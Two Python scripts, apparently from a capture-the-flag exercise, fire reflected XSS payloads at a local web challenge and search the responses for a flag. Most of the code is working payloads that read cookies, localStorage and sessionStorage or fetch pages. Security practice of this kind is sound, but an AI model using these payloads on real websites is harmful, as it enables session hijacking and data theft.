import requests
import urllib.parse
import re

base_url = "http://127.0.0.1:32955/page"

# Test various XSS payloads to find the flag
payloads = [
    # Confirmed working payloads
    "<img src=x onerror=top.alert('XSS')>",
    "<svg onload=top.alert('XSS')>",
    
    # Payloads to extract data
    "<img src=x onerror=alert(document.cookie)>",
    "<svg onload=alert(document.cookie)>",
    
    "<img src=x onerror=alert(document.body.innerHTML)>",
    "<svg onload=alert(document.body.innerHTML)>",
    
    # Try to access localStorage
    "<img src=x onerror=alert(localStorage.getItem('flag'))>",
    "<svg onload=alert(localStorage.getItem('flag'))>",
    
    # Try accessing localStorage with all keys
    "<img src=x onerror=alert(JSON.stringify(localStorage))>",
    "<svg onload=alert(JSON.stringify(localStorage))>",
    
    # Try document.domain
    "<img src=x onerror=alert(document.domain)>",
    "<svg onload=alert(document.domain)>",
    
    # Try to get all cookies
    "<img src=x onerror=alert(document.cookie.split(';').join('\\n'))>",
    
    # Try to access sessionStorage
    "<img src=x onerror=alert(JSON.stringify(sessionStorage))>",
    "<svg onload=alert(JSON.stringify(sessionStorage))>",
    
    # Try parent/window objects
    "<img src=x onerror=alert(window.location)>",
    "<img src=x onerror=alert(parent.location)>",
    
    # Try to access secret or hidden elements
    "<img src=x onerror='var s=document.getElementsByTagName(\"script\");for(var i=0;i<s.length;i++)alert(s[i].innerHTML)'>"
]

print("[+] Testing XSS payloads on", base_url)
print("=" * 60)

flag_pattern = re.compile(r'FLAG\{[^}]+\}', re.IGNORECASE)

for i, payload in enumerate(payloads, 1):
    # URL encode the payload
    encoded_payload = urllib.parse.quote(payload)
    url = f"{base_url}?input={encoded_payload}"
    
    try:
        response = requests.get(url, timeout=10)
        
        print(f"\n[TEST {i}] Payload: {payload[:60]}...")
        print(f"[+] URL: {url}")
        print(f"[+] Status: {response.status_code}")
        print(f"[+] Length: {len(response.text)} bytes")
        
        # Check for FLAG in response
        flags = flag_pattern.findall(response.text)
        if flags:
            print(f"[!] FOUND FLAG: {flags}")
        
        # Check if payload is reflected
        if payload in response.text:
            print(f"[+] Payload reflected in response (unencoded)")
        elif encoded_payload in response.text:
            print(f"[+] Payload reflected in response (encoded)")
        
        # Look for any interesting patterns in response
        if "alert" in response.text.lower():
            print(f"[+] 'alert' found in response")
        if "cookie" in response.text.lower():
            print(f"[+] 'cookie' found in response")
        if "localstorage" in response.text.lower():
            print(f"[+] 'localStorage' found in response")
        
        # Print response preview if it looks interesting
        if flags or "alert" in response.text.lower():
            print(f"\n[+] Response preview:\n{response.text[:500]}")
            
    except Exception as e:
        print(f"[X] Error with payload {i}: {e}")

print("\n" + "=" * 60)
print("[+] Testing POST requests with payloads...")

# Try POST method
for i, payload in enumerate(payloads[:5], 1):
    try:
        response = requests.post(base_url, data={"input": payload}, timeout=10)
        
        print(f"\n[POST TEST {i}] Payload: {payload[:50]}...")
        print(f"[+] Status: {response.status_code}")
        
        flags = flag_pattern.findall(response.text)
        if flags:
            print(f"[!] FOUND FLAG in POST: {flags}")
            print(f"[+] Response: {response.text[:800]}")
            
    except Exception as e:
        print(f"[X] POST error: {e}")

print("\n[+] Testing fetch-based exfiltration payloads...")

# Try fetch-based exfiltration (may reveal more in server logs or responses)
fetch_payloads = [
    "<img src=x onerror=\"fetch('http://127.0.0.1:32955/').then(r=>r.text()).then(t=>alert(t))\">",
    "<svg onload=\"fetch('/').then(r=>r.text()).then(t=>alert(t))\">",
    "<img src=x onerror=\"fetch('/page').then(r=>r.text()).then(t=>alert(t.slice(0,500)))\">"
]

for i, payload in enumerate(fetch_payloads, 1):
    try:
        encoded = urllib.parse.quote(payload)
        url = f"{base_url}?input={encoded}"
        response = requests.get(url, timeout=10)
        
        print(f"\n[FETCH TEST {i}] Status: {response.status_code}")
        flags = flag_pattern.findall(response.text)
        if flags:
            print(f"[!] FOUND FLAG: {flags}")
            
    except Exception as e:
        print(f"[X] Fetch error: {e}")

print("\n[+] All tests completed.")

import requests
import urllib.parse
import re

base_url = "http://127.0.0.1:32955/page"

# Get full response with one of the working payloads
payload = "<img src=x onerror=top.alert('XSS')>"
encoded_payload = urllib.parse.quote(payload)
url = f"{base_url}?input={encoded_payload}"

print("[+] Sending XSS payload and analyzing full response...")
print(f"[+] URL: {url}\n")

response = requests.get(url)

print(f"Status: {response.status_code}")
print(f"Content-Type: {response.headers.get('Content-Type', 'N/A')}")
print(f"Content-Length: {len(response.text)} bytes\n")

print("=" * 60)
print("FULL RESPONSE BODY:")
print("=" * 60)
print(response.text)
print("=" * 60)

# Search for FLAG pattern
flag_pattern = re.compile(r'FLAG\{[^}]+\}', re.IGNORECASE)
flags = flag_pattern.findall(response.text)

if flags:
    print(f"\n[!] FLAG FOUND: {flags}")
else:
    print("\n[-] No FLAG{} pattern found in initial response")

# Look for hidden comments, script tags, and meta data
print("\n[+] Searching for hidden data...")

# Check HTML comments
comments = re.findall(r'<!--(.*?)-->', response.text, re.DOTALL)
if comments:
    print(f"\n[+] HTML Comments found:")
    for c in comments:
        print(f"  - {c.strip()}")

# Check script tags
scripts = re.findall(r'<script[^>]*>(.*?)</script>', response.text, re.DOTALL | re.IGNORECASE)
if scripts:
    print(f"\n[+] Script content found:")
    for s in scripts:
        if s.strip():
            print(f"  Script: {s.strip()[:300]}")

# Check for inline event handlers
inline_js = re.findall(r'on\w+="([^"]+)"', response.text, re.IGNORECASE)
if inline_js:
    print(f"\n[+] Inline event handlers found:")
    for js in inline_js:
        print(f"  - {js[:200]}")

# Check meta tags
meta_tags = re.findall(r'<meta[^>]+>', response.text, re.IGNORECASE)
if meta_tags:
    print(f"\n[+] Meta tags found:")
    for m in meta_tags:
        print(f"  - {m}")

# Check for data attributes
data_attrs = re.findall(r'data-\w+="([^"]+)"', response.text)
if data_attrs:
    print(f"\n[+] Data attributes found:")
    for d in data_attrs:
        print(f"  - {d}")

# Look for any interesting strings that might be flags
interesting = re.findall(r'[A-Za-z0-9_\-]{10,}', response.text)
filtered = [s for s in interesting if 'FLAG' in s.upper() or 'FLAG' in s or len(s) > 20]
if filtered:
    print(f"\n[+] Potentially interesting strings:")
    for s in set(filtered):
        print(f"  - {s}")

print("\n[+] Checking response with different input parameter names...")

# Try other common parameter names
params = ['q', 'search', 'text', 'data', 'content', 'value', 'name', 'id', 'payload']
for param in params:
    try:
        url_alt = f"{base_url}?{param}={encoded_payload}"
        resp = requests.get(url_alt)
        flags_alt = flag_pattern.findall(resp.text)
        if flags_alt:
            print(f"[!] FLAG FOUND with param '{param}': {flags_alt}")
            print(f"[+] URL: {url_alt}")
    except:
        pass

print("\n[+] Testing if flag might be in cookies returned...")
print(f"[+] Cookies: {response.cookies.get_dict()}")

